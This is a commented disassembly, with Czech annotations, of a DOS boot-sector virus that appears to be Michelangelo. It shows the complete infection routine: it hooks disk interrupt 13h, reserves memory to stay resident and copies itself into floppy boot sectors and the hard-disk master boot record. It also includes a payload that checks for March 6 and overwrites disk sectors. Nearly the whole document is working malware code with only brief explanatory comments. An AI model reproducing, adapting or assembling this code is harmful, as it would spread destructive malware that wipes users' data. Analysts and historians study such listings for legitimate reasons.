

7C00 E9AC00         JMP    7CAF

7C03 DW 00F5        ; Pokracovani viru  offset
     DW    ?        ;                   segment
7C07 DB   02
7C08 DW    ?        ; Sektor s boot sektorem
7C0A DD    ?        ; Puvodni obsluha preruseni 13H

;=========================================================================
; Nova obsluha preruseni 13H.
;
000E 1E             PUSH   DS
000F 50             PUSH   AX
0010 0AD2           OR     DL,DL               ; Cislo disku
0012 751B           JNZ    002F
0014 33C0           XOR    AX,AX
0016 8ED8           MOV    DS,AX
0018 F6063F0401     TEST   Byte Ptr [043F],01  ; Test na disketu
001D 7510           JNZ    002F
001F 58             POP    AX
0020 1F             POP    DS
0021 9C             PUSHF
0022 2EFF1E0A00     CALL   FAR CS:[000A]
0027 9C             PUSHF
0028 E80B00         CALL   0036
002B 9D             POPF
002C CA0200         RETF   0002
002F 58             POP    AX
0030 1F             POP    DS
0031 2EFF2E0A00     JMP    FAR CS:[000A]
;-------------------------------------------------------------------------
0036 50             PUSH   AX
0037 53             PUSH   BX
0038 51             PUSH   CX
0039 52             PUSH   DX
003A 1E             PUSH   DS
003B 06             PUSH   ES
003C 56             PUSH   SI
003D 57             PUSH   DI
003E 0E             PUSH   CS
003F 1F             POP    DS
0040 0E             PUSH   CS
0041 07             POP    ES
0042 BE0400         MOV    SI,0004
0045 B80102         MOV    AX,0201
0048 BB0002         MOV    BX,0200
004B B90100         MOV    CX,0001
004E 33D2           XOR    DX,DX
0050 9C             PUSHF
0051 FF1E0A00       CALL   FAR [000A]
0055 730C           JNB    0063
0057 33C0           XOR    AX,AX
0059 9C             PUSHF
005A FF1E0A00       CALL   FAR [000A]
005E 4E             DEC    SI
005F 75E4           JNZ    0045
0061 EB43           JMP    00A6
0063 33F6           XOR    SI,SI
0065 FC             CLD
0066 AD             LODSW
0067 3B07           CMP    AX,[BX]
0069 7506           JNZ    0071
006B AD             LODSW
006C 3B4702         CMP    AX,[BX+02]
006F 7435           JZ     00A6
0071 B80103         MOV    AX,0301
0074 B601           MOV    DH,01
0076 B103           MOV    CL,03
0078 807F15FD       CMP    Byte Ptr [BX+15],FD   ; MEDIA DESCRIPTOR
007C 7402           JZ     0080                  ; FD ds 9 sect
007E B10E           MOV    CL,0E
0080 890E0800       MOV    [0008],CX
0084 9C             PUSHF
0085 FF1E0A00       CALL   FAR [000A]
0089 721B           JB     00A6
008B BEBE03         MOV    SI,03BE
008E BFBE01         MOV    DI,01BE
0091 B92100         MOV    CX,0021
0094 FC             CLD
0095 F3             REPZ
0096 A5             MOVSW
0097 B80103         MOV    AX,0301
009A 33DB           XOR    BX,BX
009C B90100         MOV    CX,0001
009F 33D2           XOR    DX,DX
00A1 9C             PUSHF
00A2 FF1E0A00       CALL   FAR [000A]
00A6 5F             POP    DI
00A7 5E             POP    SI
00A8 07             POP    ES
00A9 1F             POP    DS
00AA 5A             POP    DX
00AB 59             POP    CX
00AC 5B             POP    BX
00AD 58             POP    AX
00AE C3             RET
;=========================================================================
; START VIRU.
;
7CAF 33C0           XOR    AX,AX
7CB1 8ED8           MOV    DS,AX
7CB3 FA             CLI
7CB4 8ED0           MOV    SS,AX
7CB6 B8007C         MOV    AX,7C00
7CB9 8BE0           MOV    SP,AX
7CBB FB             STI
7CBC 1E             PUSH   DS
7CBD 50             PUSH   AX
7CBE A14C00         MOV    AX,[004C]          ; Precteni preruseni 13H.
7CC1 A30A7C         MOV    [7C0A],AX          ;
7CC4 A14E00         MOV    AX,[004E]          ;
7CC7 A30C7C         MOV    [7C0C],AX          ;
7CCA A11304         MOV    AX,[0413]          ; Velikost pameti v KByte
7CCD 48             DEC    AX                 ; zmensime o 2 KByte.
7CCE 48             DEC    AX                 ;
7CCF A31304         MOV    [0413],AX          ;
7CD2 B106           MOV    CL,06              ; Prepocteme na paragrafy
7CD4 D3E0           SHL    AX,CL
7CD6 8EC0           MOV    ES,AX
7CD8 A3057C         MOV    [7C05],AX
7CDB B80E00         MOV    AX,000E            ; Nova obsluha 13H je od
7CDE A34C00         MOV    [004C],AX          ; 0E
7CE1 8C064E00       MOV    [004E],ES
7CE5 B9BE01         MOV    CX,01BE            ; Preneseme 1BE byte nahoru
7CE8 BE007C         MOV    SI,7C00            ; do pameti.
7CEB 33FF           XOR    DI,DI
7CED FC             CLD
7CEE F3             REPZ
7CEF A4             MOVSB
7CF0 2EFF2E037C     JMP    FAR CS:[7C03]

7CF5 33C0           XOR    AX,AX       ; Reset disku/diskety
7CF7 8EC0           MOV    ES,AX
7CF9 CD13           INT    13          ;----------------------------------
7CFB 0E             PUSH   CS
7CFC 1F             POP    DS
7CFD B80102         MOV    AX,0201     ; Zde nacitame BOOT sektor.
7D00 BB007C         MOV    BX,7C00     ;
7D03 8B0E0800       MOV    CX,[0008]   ;
7D07 83F907         CMP    CX,+07      ;
7D0A 7507           JNZ    7D13
7D0C BA8000         MOV    DX,0080
7D0F CD13           INT    13
7D11 EB2B           JMP    7D3E
7D13 8B0E0800       MOV    CX,[0008]
7D17 BA0001         MOV    DX,0100
7D1A CD13           INT    13
7D1C 7220           JB     7D3E
7D1E 0E             PUSH   CS
7D1F 07             POP    ES
7D20 B80102         MOV    AX,0201      ; Nacteme BOOT disku.
7D23 BB0002         MOV    BX,0200
7D26 B90100         MOV    CX,0001
7D29 BA8000         MOV    DX,0080
7D2C CD13           INT    13
7D2E 720E           JB     7D3E
7D30 33F6           XOR    SI,SI        ; Porovname prvni 4 byte.
7D32 FC             CLD                 ;
7D33 AD             LODSW               ;
7D34 3B07           CMP    AX,[BX]      ;
7D36 754F           JNZ    7D87         ;
7D38 AD             LODSW               ;
7D39 3B4702         CMP    AX,[BX+02]   ; Pokud disk neni napaden, odskok
7D3C 7549           JNZ    7D87         ;---------------------------------
7D3E 33C9           XOR    CX,CX
7D40 B404           MOV    AH,04        ; Cti systemovy cas.
7D42 CD1A           INT    1A           ;
7D44 81FA0603       CMP    DX,0306      ; 6. brezna provadi destrukci
7D48 7401           JZ     7D4B
7D4A CB             RETF
7D4B 33D2           XOR    DX,DX
7D4D B90100         MOV    CX,0001
7D50 B80903         MOV    AX,0309
7D53 8B360800       MOV    SI,[0008]
7D57 83FE03         CMP    SI,+03
7D5A 7410           JZ     7D6C
7D5C B00E           MOV    AL,0E
7D5E 83FE0E         CMP    SI,+0E
7D61 7409           JZ     7D6C
7D63 B280           MOV    DL,80
7D65 C606070004     MOV    Byte Ptr [0007],04
7D6A B011           MOV    AL,11
7D6C BB0050         MOV    BX,5000
7D6F 8EC3           MOV    ES,BX
7D71 CD13           INT    13
7D73 7304           JNB    7D79
7D75 32E4           XOR    AH,AH
7D77 CD13           INT    13
7D79 FEC6           INC    DH
7D7B 3A360700       CMP    DH,[0007]    ; Pocet hlav.
7D7F 72CF           JB     7D50
7D81 32F6           XOR    DH,DH
7D83 FEC5           INC    CH
7D85 EBC9           JMP    7D50
;-------------------------------------------------------------------------
7D87 B90700         MOV    CX,0007
7D8A 890E0800       MOV    [0008],CX
7D8E B80103         MOV    AX,0301
7D91 BA8000         MOV    DX,0080
7D94 CD13           INT    13
7D96 72A6           JB     7D3E
7D98 BEBE03         MOV    SI,03BE
7D9B BFBE01         MOV    DI,01BE
7D9E B92100         MOV    CX,0021
7DA1 F3             REPZ
7DA2 A5             MOVSW
7DA3 B80103         MOV    AX,0301
7DA6 33DB           XOR    BX,BX
7DA8 FEC1           INC    CL
7DAA CD13           INT    13
7DAC EB90           JMP    7D3E

7DB0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 64 20  ..............d
7DC0  70 72 65 73 73 20 61 6E-79 20 6B 65 79 20 77 68  press any key wh
7DD0  65 6E 20 72 65 61 64 79-0D 0A 00 49 4F 20 20 20  en ready...IO
7DE0  20 20 20 53 59 53 4D 53-44 4F 53 20 20 20 53 59     SYSMSDOS   SY
7DF0  53 00 00 00 00 00 00 00-00 00 00 00 00 00 55 AA  S.............U*

